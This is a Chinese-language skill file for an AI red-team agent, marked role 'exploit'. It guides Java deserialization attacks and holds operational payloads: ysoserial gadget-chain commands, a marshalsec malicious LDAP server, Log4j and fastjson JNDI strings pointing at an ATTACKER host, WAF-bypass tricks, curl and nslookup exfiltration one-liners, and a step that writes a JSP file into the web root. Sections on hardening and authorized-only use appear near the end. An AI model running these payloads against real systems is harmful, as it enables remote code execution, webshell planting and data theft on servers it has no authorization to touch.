---
name: java-deserialization
description: Java 反序列化实战：识别入口与特征（AC ED 00 05 / rO0AB / H4sI）、按依赖选链（CC1-7、Groovy、Spring、Jdk7u21、JRMP）、ysoserial 用法、JNDI 注入与 WAF 绕过、盲打与回显
whenToUse: 目标 Java 应用出现序列化数据（ViewState/rememberMe/session/token/RMI 参数），或需要打 fastjson/Jackson/Shiro/Log4j 这类反序列化入口时
role: exploit
enabled: true
---

# Java 反序列化（选链比造链重要）

## 1. 先认入口：这五类地方会出现序列化数据
| 位置 | 特征 |
| --- | --- |
| HTTP 参数/Header | Base64 里含 `rO0AB`（= `AC ED 00 05` 的 base64 前缀），如 `rememberMe=`、`token=`、`session=` |
| Cookie | `JSESSIONID` 之外的二进制/Base64 cookie（Shiro 的 `rememberMe` 最典型） |
| ViewState | .NET 侧同理；Java 侧对应 `serialVersionUID⟧T⟧ 报错回显 |
| RMI/JNDI | 1099/1098 端口上的 `java.rmi.MarshalledObject` |
| 库层 | fastjson `@type`、Jackson `enableDefaultTyping`、XStream、Hessian、Dubbo、Kafka Connect |

识别三态：**原始字节** `AC ED 00 05`、**Base64** `rO0AB`、**gzip+Base64** `H4sI`（解压后仍是 `AC ED…`）。

## 2. 选链：按目标 classpath 里有什么（顺序即优先级）
| 链 | 依赖 | 适用 |
| --- | --- | --- |
| **CommonsCollections1/3/5/6/7** | commons-collections **3.1** | 最经典，7 兼容高版本 JDK |
| **CommonsCollections2/4** | commons-collections**4** 4.0 | 3.x 被修后仍可用 |
| **CommonsBeanutils1** | commons-beanutils + 3.x | CC 不在时常用 |
| **Groovy1** | groovy 2.3.x | 有 Groovy 的中间件 |
| **Spring1/2** | spring-core/beans 4.x | Spring 应用 |
| **Jdk7u21** | JDK ≤ 7u21 原生 | 无第三方依赖也可能打通 |
| **JRMPClient/Listener** | 纯 JDK | 打 RMI、做二次跳板（绕 classpath 限制） |
| **URLDNS** | 纯 JDK | **只做探测**（DNS 回连），不执行命令 |

工具：
```bash
java -jar ysoserial-all.jar CommonsCollections6 'curl http://OAST/$(id -u)' | base64 -w0   # 生成
java -jar ysoserial-all.jar URLDNS http://xxx.dnslog.cn > u.bin                              # 探测
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'cmd'     # 起 JRMP
```
> 先用 `URLDNS` / `JRMPClient` 确认"反序列化点真的存在"，再上命令执行链——盲打直接上 CC 会浪费时间。

## 3. JNDI 注入（Log4j / fastjson 这条线）
1. 起恶意 LDAP/RMI：`marshalsec`（`marshalsec-0.0.3-SNAPSHOT-all.jar`）→ `java -cp ... marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit" 1389`。
2. 触发：Log4j 的 `${jndi:ldap://ATTACKER:1389/a}`；fastjson 的 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`。
3. **版本闸门**（决定成败）：
   - JDK 6u141 / 7u131 / 8u121 起 `com.sun.jndi.ldap.object.trustURLCodebase=false⟧T⟧ → 远程 codebase 失效；
   - 绕过：改用**本地工厂类** gadget（如 `org.apache.naming.factory.BeanFactory` + EL、Tomcat 的 `ELProcessor`），或让 LDAP 返回序列化对象做二次反序列化。
4. 确认：OAST 侧看到回连 + 目标侧 DNS 记录；命令执行用 `curl`/`nslookup` 带出。

## 4. 绕过 WAF / 过滤（按顺序试）
| 手法 | 做法 |
| --- | --- |
| 编码层 | Base64 → gzip+Base64（`H4sI`）→ 十六进制；先确认服务端解码顺序 |
| 特征剥离 | ysoserial 的 `-o` 参数、改 `serialVersionUID`、换链避开被杀的特征类名 |
| 分段投递 | 参数拆分/多次写入（如 session 分片） |
| 传输位 | 换 Content-Type（`application/x-java-serialized-object`）、换参数名、塞进 cookie |
| JNDI 变形 | `ldap://` → `ldaps://`/`rmi://`；IP 用十进制/短写；域名加 `.` 结尾绕黑名单 |

## 5. 盲打与回显
- **盲打**：命令写成 `curl http://OAST/$(whoami)`、`nslookup $(id -u).OAST`；Windows 用 `certutil -urlcache -f`。
- **回显**：优先找能控制响应体的 gadget（TemplatesImpl + 自定义 Response），或写文件到 web 目录（`... > ../../webapps/ROOT/x.jsp`）。
- **验证跑通**：先 `sleep 5` / `ping` 看延迟与回连，再上真实命令；每步独立留证。

## 6. 加固视角（报告里要写清）
| 措施 | 要点 |
| --- | --- |
| JEP 290 ObjectInputFilter | `-Djdk.serialFilter=` 白名单，优先级最高 |
| 禁 autoType | fastjson `safeMode`、Jackson 关 `enableDefaultTyping`、XStream 白名单 |
| 升级 | commons-collections 3.2.2+、Shiro 1.7+（rememberMe 改 AES-GCM）、Log4j 2.17+ |
| 网络层 | 出站限制（LDAP/RMI/DNS），能挡住大部分 JNDI 链 |

## 7. 落库
- 入口与链 → `redteam_vuln_add`（title="<应用> <入口> Java 反序列化"，evidence 放原始请求 + 回连记录）；
- payload 生成命令 → `redteam_attack_file_add`（kind=poc，**只在真打通时**）；
- 通用链 → `redteam_poc_add`（category=deserialization，language=java，verified 写"在哪台目标、什么回显"）。

## 8. 纪律
只对授权目标验证；先 `URLDNS` 探测再上命令执行，避免把生产打成雪崩；JNDI 外连只用你自己的 OAST 域名。
